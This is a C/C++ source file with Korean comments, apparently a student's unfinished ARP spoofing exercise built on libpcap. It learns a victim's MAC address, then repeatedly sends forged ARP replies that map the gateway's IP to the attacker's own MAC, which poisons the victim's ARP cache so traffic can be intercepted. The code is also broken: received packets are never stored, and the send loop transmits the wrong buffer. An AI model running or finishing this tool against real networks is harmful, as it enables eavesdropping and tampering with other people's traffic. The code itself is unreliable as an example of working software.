#include "stdafx.h"


int main(int argc, char *argv[]) {
    if (argc != 4) {
        printf("--Wrong arguments---\n %s <interface> <sender_IP> <gateway_IP>\n", argv[0]);
        return -5;
    }
    // packet에서 srcMAC를 gateway(target_ip의 MAC)로
    // dstMAC을 sender_ip의 MAC으로

    u_char sender_ip[4];
    u_char gateway_ip[4];

    // sender_ip와 gateway_ip에 argv값을 전달
    {
        char* temp;
        temp = strtok(argv[2], ".");
        sender_ip[0] = atoi(temp);
        for(int i= 1; i<IP_SIZE; i++){
            sender_ip[i] = atoi(strtok(NULL, "."));
        }

        temp = strtok(argv[3], ".");
        gateway_ip[0] = atoi(temp);
        for(int i= 1; i<IP_SIZE; i++){
            gateway_ip[i] = atoi(strtok(NULL, "."));
        }

    }

    for(int i = 0; i<IP_SIZE; i++){
        printf("%d.", sender_ip[i]);
    }
    printf("\n");
    for(int i = 0; i<IP_SIZE; i++){
        printf("%d.", gateway_ip[i]);
    }
    printf("\n\n\n");

    const u_char* ucp_DATA;
    pcap_t *stp_NIC;

    u_char myMac[6];
    getMyMac(myMac, argv[1]);
    char* interface = argv[1];
    // char* interface = argv[1];
    //char* sender_ip = argv[2];
    //char gateway_ip[] = {192,168,43,1};
    //char* gateway_ip = argv[2];
    char errbuf[PCAP_ERRBUF_SIZE];

    pcap_t* handle = pcap_open_live(interface, BUFSIZ, 1, 1000, errbuf);
    if (handle == NULL) {
        fprintf(stderr, "couldn't open device %s: %s\n", interface, errbuf);
        return -1;
    }

    struct pcap_pkthdr* header;
    const uint8_t* packet;
    u_char SenderMAC[6];
    u_char DstMAC[6];

    arp_packet arp_data;
    arp_packet rec_pck;
    arp_data.modifyTargetIP((u_char*)sender_ip);

    // 구조체화 시키기
    arp_data.modifySenderMAC(myMac);

    pcap_sendpacket(handle, (const u_char*) &(arp_data.data), 42);
    while(true){
        if(pcap_next_ex(handle, &header, &packet)==0){
            continue;
        }
        //TODO packet을 rec_pck에 넣을 수 있게 함수구현해야할 것
        //memcpy(rec_pck.data, packet, ARP_SIZE);
        if(rec_pck.isARP() && rec_pck.isRep()){
            break;
        }
    }

    memcpy(SenderMAC, rec_pck.getSendMac(), MAC_SIZE);
    memcpy(DstMAC, rec_pck.getDstMac(), MAC_SIZE);

    arp_data.modifyETHSource(myMac);
    arp_data.modifySenderIP((u_char*)gateway_ip);
    arp_data.modifyTargetIP((u_char*)sender_ip);
    arp_data.modifyOP(ARP_REPLY);
    arp_data.modifyTargetMAC(DstMAC);
    arp_data.modifyETHDestination(DstMAC);

    printf("\nIP");

    printf("\nPress ^c to Exit.");
    while(true){
        pcap_sendpacket(handle, (const u_char*) &(rec_pck.data), 42);
        printf("packet send\n");
        sleep(1);
    }
}
/*
          * 데스티네이션 상대
          * 소스 자신
          *
          * 센더HA 자신
          * 센더IP 43.1
          * 타겟 HA 상대
          * 타겟아이피 상대
          */


//계속보낼때
// sender ip: